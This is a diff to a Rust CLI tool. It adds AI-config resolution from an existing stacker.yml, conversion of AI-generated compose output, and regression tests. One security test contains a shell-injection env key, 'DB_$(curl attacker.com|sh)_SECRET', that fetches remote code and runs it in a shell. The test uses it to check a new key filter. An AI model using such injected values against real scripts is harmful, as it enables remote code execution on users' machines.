@@ -1,3 +1,4 @@
+use std::collections::{BTreeMap, HashMap};
 use std::convert::TryFrom;
 use std::io::{self, IsTerminal, Write};
 use std::path::{Path, PathBuf};
@@ -487,10 +488,16 @@ pub fn resolve_ai_config(
         .map(|s| s.to_string())
         .or_else(|| std::env::var("STACKER_AI_MODEL").ok());
 
-    // Endpoint: flag > env
-    let endpoint = ai_endpoint
-        .map(|s| s.to_string())
-        .or_else(|| std::env::var("STACKER_AI_ENDPOINT").ok());
+    // Endpoint: flag > env (only for ollama/custom — openai/anthropic
+    // have well-known defaults that should not be overridden by env).
+    let endpoint = ai_endpoint.map(|s| s.to_string()).or_else(|| {
+        match provider {
+            AiProviderType::Ollama | AiProviderType::Custom => {
+                std::env::var("STACKER_AI_ENDPOINT").ok()
+            }
+            _ => None,
+        }
+    });
 
     // Timeout: env > default (300s)
     let timeout = std::env::var("STACKER_AI_TIMEOUT")
@@ -580,7 +587,24 @@ pub fn generate_config_full(
 
     // If --with-ai is set, try AI-powered generation
     if with_ai {
-        let ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+        let mut ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+
+        // If no provider was explicitly specified, check existing stacker.yml
+        if ai_provider.is_none()
+            && ai_model.is_none()
+            && ai_api_key.is_none()
+            && ai_endpoint.is_none()
+            && config_path.exists()
+        {
+            if let Ok(existing) = StackerConfig::from_file(&config_path) {
+                if existing.ai.enabled {
+                    ai_config.provider = existing.ai.provider;
+                    if existing.ai.model.is_some() { ai_config.model = existing.ai.model; }
+                    if existing.ai.api_key.is_some() { ai_config.api_key = existing.ai.api_key; }
+                    if existing.ai.endpoint.is_some() { ai_config.endpoint = existing.ai.endpoint; }
+                }
+            }
+        }
 
         match create_provider(&ai_config) {
             Ok(provider) => {
@@ -1233,7 +1257,37 @@ pub fn generate_config_from_github(
     // Dockerfile for better context), fall back to template detection.
     let temp_config_path = cloned_path.join(DEFAULT_CONFIG_FILE);
     let (result, used_ai) = if with_ai {
-        let ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+        // Resolve AI config: CLI flags > env vars > existing stacker.yml > defaults
+        let mut ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+
+        // If no provider was explicitly specified, check the existing stacker.yml
+        // in the target directory (set up via `stacker config setup ai`).
+        if ai_provider.is_none()
+            && ai_model.is_none()
+            && ai_api_key.is_none()
+            && ai_endpoint.is_none()
+        {
+            let existing_yaml = project_dir.join(DEFAULT_CONFIG_FILE);
+            if existing_yaml.exists() {
+                if let Ok(existing) = StackerConfig::from_file(&existing_yaml) {
+                    if existing.ai.enabled {
+                        ai_config.provider = existing.ai.provider;
+                        if existing.ai.model.is_some() {
+                            ai_config.model = existing.ai.model;
+                        }
+                        if existing.ai.api_key.is_some() {
+                            ai_config.api_key = existing.ai.api_key;
+                        }
+                        if existing.ai.endpoint.is_some() {
+                            ai_config.endpoint = existing.ai.endpoint;
+                        }
+                        eprintln!("🤖 Using AI config from existing stacker.yml (provider: {})",
+                            ai_config.provider);
+                    }
+                }
+            }
+        }
+
         match create_provider(&ai_config) {
             Ok(provider) => {
                 eprintln!("🤖 Generating config with AI ({} — {})...",
@@ -1248,16 +1302,33 @@ pub fn generate_config_from_github(
                     Ok(path) => (Ok(path), true),
                     Err(e) => {
                         eprintln!("⚠ AI generation failed: {}", e);
-                        eprintln!("  Falling back to template-based generation.");
-                        eprintln!("  Tip: make sure your Ollama model supports code generation.");
-                        eprintln!("  Available models: ollama list\n");
-                        (generate_config_template_path(
-                            &cloned_path,
-                            &temp_config_path,
-                            app_type_override,
-                            with_proxy,
-                            with_ai,
-                        ), false)
+
+                        // Try converting compose-format output before falling back
+                        let draft_path = cloned_path.join("stacker.yml.ai-draft");
+                        let mut converted = false;
+                        if let Ok(draft) = std::fs::read_to_string(&draft_path) {
+                            if let Some(cfg) = convert_compose_to_stacker(&draft, &repo) {
+                                let yaml = serialize_generated_config(&cfg).unwrap_or_default();
+                                let _ = std::fs::write(&temp_config_path, &yaml);
+                                eprintln!("  ✓ Converted docker-compose output to stacker.yml format.");
+                                converted = true;
+                            }
+                        }
+
+                        if converted {
+                            (Ok(temp_config_path), true)
+                        } else {
+                            eprintln!("  Falling back to template-based generation.");
+                            eprintln!("  Tip: make sure your Ollama model supports code generation.");
+                            eprintln!("  Available models: ollama list\n");
+                            (generate_config_template_path(
+                                &cloned_path,
+                                &temp_config_path,
+                                app_type_override,
+                                with_proxy,
+                                with_ai,
+                            ), false)
+                        }
                     }
                 }
             }
@@ -1290,7 +1361,14 @@ pub fn generate_config_from_github(
             // (it points into the temp clone that will be cleaned up), and
             // rewrite the cleaned config to the target project directory.
             let mut config = StackerConfig::from_file(&temp_path)?;
+            let was_ai = used_ai;
             config.deploy.compose_file = None;
+
+            // Post-process AI output: move the main app from services to
+            // app.image block, filter unsupported port ranges.
+            if was_ai {
+                sanitize_ai_config(&mut config, &repo);
+            }
 
             let cleaned_yaml = serialize_generated_config(&config)?;
             let method = if used_ai { "stacker init --from-github --with-ai" }
@@ -1387,6 +1465,225 @@ pub fn generate_config_from_github(
         }
         Err(e) => Err(e),
     }
+}
+
+/// Post-process AI-generated config to fix common model mistakes:
+/// - Move the main app from `services:` to `app.image:` when a service
+///   matches the repo name and has a public image.
+/// - Strip port ranges (e.g. 6379-6399:6379-6399) which Stacker cannot parse.
+fn sanitize_ai_config(config: &mut StackerConfig, repo_name: &str) {
+    use crate::cli::github_fetcher::is_infra_image;
+
+    // ── Move main app service to app.image ──
+    // Priority: exact repo name match → common AI service names → sole non-infra service.
+    if config.app.image.is_none() {
+        const COMMON_APP_NAMES: &[&str] = &["app", "web", "server", "api", "backend", "frontend"];
+
+        let pos = config
+            .services
+            .iter()
+            .position(|svc| svc.name == repo_name && !svc.image.is_empty())
+            .or_else(|| {
+                config.services.iter().position(|svc| {
+                    !svc.image.is_empty()
+                        && COMMON_APP_NAMES.contains(&svc.name.as_str())
+                        && !is_infra_image(&svc.image)
+                })
+            })
+            .or_else(|| {
+                // Fall back to the sole non-infra service when there is exactly one.
+                let non_infra: Vec<usize> = config
+                    .services
+                    .iter()
+                    .enumerate()
+                    .filter(|(_, svc)| !svc.image.is_empty() && !is_infra_image(&svc.image))
+                    .map(|(i, _)| i)
+                    .collect();
+                if non_infra.len() == 1 { Some(non_infra[0]) } else { None }
+            });
+
+        if let Some(pos) = pos {
+            let svc = config.services.remove(pos);
+            config.app.image = Some(svc.image.clone());
+            config.app.app_type = AppType::Custom;
+
+            if config.app.ports.is_empty() {
+                config.app.ports = svc.ports.clone();
+            }
+            if config.app.volumes.is_empty() {
+                config.app.volumes = svc.volumes.clone();
+            }
+            if config.app.environment.is_empty() {
+                config.app.environment = svc.environment.clone();
+            }
+            // Always clear dockerfile when a pre-built image is set —
+            // the slash check missed official Docker Hub images like redis:7.
+            config.app.dockerfile = None;
+        }
+    }
+
+    // ── Strip port ranges from all ports lists ──
+    fn is_port_range(port: &str) -> bool {
+        port.contains('-')
+    }
+
+    config.app.ports.retain(|p| !is_port_range(p));
+    for svc in &mut config.services {
+        svc.ports.retain(|p| !is_port_range(p));
+    }
+}
+
+/// Convert docker-compose YAML output to stacker.yml format.
+/// Some models output compose format despite the system prompt.
+fn convert_compose_to_stacker(
+    ai_output: &str,
+    repo_name: &str,
+) -> Option<StackerConfig> {
+    use crate::cli::github_fetcher::is_infra_image;
+    use std::collections::HashMap;
+
+    let parsed: serde_yaml::Value = serde_yaml::from_str(ai_output).ok()?;
+
+    let is_compose = parsed.get("version").is_some()
+        || parsed.get("services").and_then(|s| s.as_mapping()).map_or(false, |m| {
+            m.values().any(|v| v.get("build").is_some() && v.get("image").is_none())
+        });
+
+    if !is_compose {
+        return None;
+    }
+
+    let services = parsed.get("services")?.as_mapping()?;
+    if services.is_empty() {
+        return None;
+    }
+
+    let mut app_image: Option<String> = None;
+    let mut app_ports: Vec<String> = Vec::new();
+    let mut app_volumes: Vec<String> = Vec::new();
+    let mut app_env: HashMap<String, String> = HashMap::new();
+    let mut infra_services: Vec<ServiceDefinition> = Vec::new();
+
+    for (name, svc_val) in services {
+        let name = match name.as_str() {
+            Some(s) => s.to_string(),
+            None => continue,
+        };
+        let svc = match svc_val.as_mapping() {
+            Some(m) => m,
+            None => continue,
+        };
+        let image = svc.get("image").and_then(|v| v.as_str()).map(|s| s.to_string());
+
+        if let Some(ref img) = image {
+            if is_infra_image(img) {
+                infra_services.push(ServiceDefinition {
+                    name,
+                    image: img.clone(),
+                    ports: extract_yaml_strings(svc.get("ports")),
+                    environment: extract_yaml_env(svc.get("environment")),
+                    volumes: extract_yaml_strings(svc.get("volumes")),
+                    depends_on: extract_yaml_strings(svc.get("depends_on")),
+                    command: None,
+                    healthcheck: crate::cli::github_fetcher::default_healthcheck(img),
+                });
+            } else {
+                app_image = Some(img.clone());
+                app_ports = extract_yaml_strings(svc.get("ports"));
+                app_volumes = extract_yaml_strings(svc.get("volumes"));
+                app_env = extract_yaml_env(svc.get("environment"));
+            }
+        } else if name == repo_name || app_image.is_none() {
+            app_ports = extract_yaml_strings(svc.get("ports"));
+            app_volumes = extract_yaml_strings(svc.get("volumes"));
+            app_env = extract_yaml_env(svc.get("environment"));
+        }
+    }
+
+    let mut config = StackerConfig {
+        name: repo_name.to_string(),
+        version: None,
+        organization: None,
+        project: crate::cli::config_parser::ProjectConfig { identity: None },
+        app: crate::cli::config_parser::AppSource {
+            app_type: AppType::Custom,
+            path: PathBuf::from("."),
+            dockerfile: app_image.is_none().then(|| PathBuf::from("Dockerfile")),
+            image: app_image,
+            build: None,
+            ports: app_ports,
+            volumes: app_volumes,
+            environment: app_env,
+            command: None,
+            healthcheck: None,
+        },
+        services: infra_services,
+        proxy: crate::cli::config_parser::ProxyConfig::default(),
+        deploy: crate::cli::config_parser::DeployConfig {
+            target: crate::cli::config_parser::DeployTarget::Local,
+            ..Default::default()
+        },
+        install: crate::cli::config_parser::InstallConfig::default(),
+        environments: BTreeMap::new(),
+        ai: crate::cli::config_parser::AiConfig::default(),
+        monitoring: crate::cli::config_parser::MonitoringConfig {
+            status_panel: false,
+            ..Default::default()
+        },
+        hooks: crate::cli::config_parser::HookConfig::default(),
+        env_file: None,
+        env: HashMap::new(),
+        config_contract: crate::cli::config_parser::ConfigContract::default(),
+        origin: crate::cli::config_parser::ConfigOrigin::UserAuthored,
+    };
+
+    // Strip port ranges
+    config.app.ports.retain(|p| !p.contains('-'));
+    for svc in &mut config.services {
+        svc.ports.retain(|p| !p.contains('-'));
+    }
+
+    Some(config)
+}
+
+fn extract_yaml_strings(value: Option<&serde_yaml::Value>) -> Vec<String> {
+    match value {
+        Some(serde_yaml::Value::Sequence(seq)) => seq
+            .iter()
+            .filter_map(|v| v.as_str().map(|s| s.to_string()))
+            .collect(),
+        _ => Vec::new(),
+    }
+}
+
+fn extract_yaml_env(value: Option<&serde_yaml::Value>) -> HashMap<String, String> {
+    let mut env = HashMap::new();
+    match value {
+        Some(serde_yaml::Value::Mapping(m)) => {
+            for (k, v) in m {
+                if let Some(key) = k.as_str() {
+                    let val = match v {
+                        serde_yaml::Value::String(s) => s.clone(),
+                        serde_yaml::Value::Number(n) => n.to_string(),
+                        serde_yaml::Value::Bool(b) => b.to_string(),
+                        _ => continue,
+                    };
+                    env.insert(key.to_string(), val);
+                }
+            }
+        }
+        Some(serde_yaml::Value::Sequence(seq)) => {
+            for item in seq {
+                if let Some(line) = item.as_str() {
+                    if let Some((k, v)) = line.split_once('=') {
+                        env.insert(k.to_string(), v.to_string());
+                    }
+                }
+            }
+        }
+        _ => {}
+    }
+    env
 }
 
 fn summarize_top_level_entries(project_dir: &Path, limit: usize) -> String {
@@ -1640,6 +1937,11 @@ pub fn generate_secrets_script_content(env_file_content: &str) -> String {
         }
         let key = parts[0].trim();
         let value = parts[1].trim();
+
+        // Only allow safe identifier characters — reject keys with shell metacharacters.
+        if !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
+            continue;
+        }
 
         if value.is_empty() && is_secret_env_key(key) {
             lines.push(format!(
@@ -2547,4 +2849,119 @@ mod tests {
         let postgres = config.services.iter().find(|s| s.name == "postgres").unwrap();
         assert_eq!(postgres.image, "postgres:16-alpine");
     }
+    // ── Security regression tests ────────────────────────────
+
+    #[test]
+    fn secrets_script_rejects_keys_with_shell_metacharacters() {
+        // Bug: keys containing $(...) are interpolated verbatim into bash
+        // double-quoted strings, enabling shell injection.
+        let env_file_content = "DB_$(curl attacker.com|sh)_SECRET=\nNORMAL_SECRET=\n";
+        let script = generate_secrets_script_content(env_file_content);
+
+        // The malicious key must NOT appear in the script in a form that
+        // would be executed (i.e. the subshell expansion must be absent).
+        assert!(
+            !script.contains("$(curl attacker.com|sh)"),
+            "Shell metacharacter injection must be sanitized or skipped; \
+             script contains unquoted subshell expansion: {:?}",
+            &script[..script.len().min(400)]
+        );
+
+        // Valid keys must still be processed.
+        assert!(
+            script.contains("NORMAL_SECRET"),
+            "Valid secret keys should still appear in the script"
+        );
+    }
+
+    #[test]
+    fn convert_compose_to_stacker_skips_null_service_entries() {
+        // Bug: `?` inside the for-loop returns None for the whole function
+        // when any service entry has a null/non-mapping value.
+        let yaml = "version: '3.8'\nservices:\n  app:\n    image: myapp/myapp:latest\n    ports:\n      - \"8080:8080\"\n  broken_service: ~\n";
+        let result = convert_compose_to_stacker(yaml, "myapp");
+        assert!(
+            result.is_some(),
+            "convert_compose_to_stacker must return Some even when a service \
+             entry has a null value; currently returns None due to early ? propagation"
+        );
+    }
+
+    #[test]
+    fn sanitize_ai_config_clears_dockerfile_for_official_docker_hub_image() {
+        // Bug: `svc.image.contains('/')` is false for official Docker Hub images
+        // like `redis:7`, so `app.dockerfile` is never cleared when those
+        // services are promoted to app.image.
+        let mut config = StackerConfig {
+            name: "myapp".to_string(),
+            app: crate::cli::config_parser::AppSource {
+                app_type: AppType::Custom,
+                image: None,
+                dockerfile: Some(PathBuf::from("Dockerfile")),
+                ..Default::default()
+            },
+            services: vec![crate::cli::config_parser::ServiceDefinition {
+                name: "myapp".to_string(),
+                image: "redis:7".to_string(),
+                ports: vec![],
+                environment: Default::default(),
+                volumes: vec![],
+                depends_on: vec![],
+                command: None,
+                healthcheck: None,
+            }],
+            ..Default::default()
+        };
+
+        sanitize_ai_config(&mut config, "myapp");
+
+        assert_eq!(
+            config.app.image,
+            Some("redis:7".to_string()),
+            "Service image should be promoted to app.image"
+        );
+        assert_eq!(
+            config.app.dockerfile,
+            None,
+            "dockerfile must be cleared when promoting a service image \
+             even when the image name contains no '/' (e.g. official Docker Hub images)"
+        );
+    }
+
+    #[test]
+    fn sanitize_ai_config_promotes_generic_service_name_as_main_app() {
+        // Bug: promotion condition `svc.name == repo_name` misses common AI
+        // service names like "app", "web", "server", "api".  When the AI
+        // names the main service "app" but the repo is "myapp", the service
+        // is never promoted → app.image stays None → E003 on deploy.
+        let mut config = StackerConfig {
+            name: "myapp".to_string(),
+            app: crate::cli::config_parser::AppSource {
+                app_type: AppType::Custom,
+                image: None,
+                ..Default::default()
+            },
+            services: vec![crate::cli::config_parser::ServiceDefinition {
+                name: "app".to_string(),
+                image: "myorg/myapp:latest".to_string(),
+                ports: vec![],
+                environment: Default::default(),
+                volumes: vec![],
+                depends_on: vec![],
+                command: None,
+                healthcheck: None,
+            }],
+            ..Default::default()
+        };
+
+        sanitize_ai_config(&mut config, "myapp");
+
+        assert_eq!(
+            config.app.image,
+            Some("myorg/myapp:latest".to_string()),
+            "A service named 'app' should be promoted as the main app image \
+             when app.image is None and the service name is a common generic alias"
+        );
+    }
+
 }
